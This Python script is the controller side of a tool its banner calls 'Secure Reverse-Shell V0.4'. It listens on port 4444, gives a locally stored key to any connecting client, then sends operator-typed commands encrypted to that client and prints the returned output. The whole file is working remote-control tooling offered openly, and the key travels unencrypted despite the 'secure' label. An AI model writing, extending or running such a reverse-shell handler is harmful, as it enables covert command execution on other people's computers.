import socket
import os
from crypto_utils import encrypt_message, decrypt_message, generate_key

def generate_new_key():
    folder = r'C:\Users\User\Documents'
    file_name = 'secret.key'
    full_path = os.path.join(folder, file_name)
    key = generate_key()
    with open(full_path, 'wb') as f:
        f.write(key)

KEY_PATH = os.path.join(r'C:\Users\User\Documents', 'secret.key')

try:
    with open(KEY_PATH, 'rb') as f:
        KEY = f.read().strip()

except FileNotFoundError:
    generate_new_key()
    with open(KEY_PATH, 'rb') as f:
        KEY = f.read().strip()

def send_key(conn, key):
    conn.send(key)

def recv_response(key, sock):
    try:
        size_header = sock.recv(64).decode('utf-8').strip()
        if not size_header:
            return None 
        data_size = int(size_header)

        sock.send(b'OK_SIZE')

    except (ValueError, socket.error):
        print('[!] Data transmission protocol error')
        return None

    data = b''
    bytes_received = 0 
    while bytes_received < data_size:
        chunk = sock.recv(min(4096, data_size - bytes_received))
        if not chunk:
            break
        data += chunk
        bytes_received += len(chunk)
    
    return decrypt_message(key, data)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 4444))
server.listen(2)
server.settimeout(60)
print('=' * 18, "\nSecure Reverse-Shell V0.4",)
print('=' * 18)
print('[*] Wait connection...')

try:
    conn, addr = server.accept()
    raw = conn.recv(1024)

    if raw == b'REQUEST_KEY':

        send_key(conn, KEY)
        ack = conn.recv(1024)

        if ack == b'KEY_RECEIVED':
            print('[+] Key sent to client')

        conn.close()
        conn, addr = server.accept()
        print(f'[+] Connection by {addr}')
        raw = conn.recv(1024)
        if raw == b'HELLO':
            print('[+] Client ready')

    elif raw == b'HELLO':
        print('[+] Client ready')

    else:
        print('[!] Unknown handshake')
        conn.close()
        server.close()
        input('[*] Press Enter to exit...')
        exit()

    while True:

        cmd = input('Command~$ ')
        if not cmd.strip():
            continue  

        encrypted_cmd = encrypt_message(KEY, cmd)
        conn.send(encrypted_cmd)

        if cmd.lower() == 'exit':
            break

        output = recv_response(KEY, conn)
        
        if output is None:
            print('[!] Сlient terminated connection')
            break

        print(output)

except socket.timeout:
    print("[!] Can't connect to client, please try again")
    
finally:
    print('[!] Connection closed')
    server.close()
    input('[*] Press Enter to exit...')
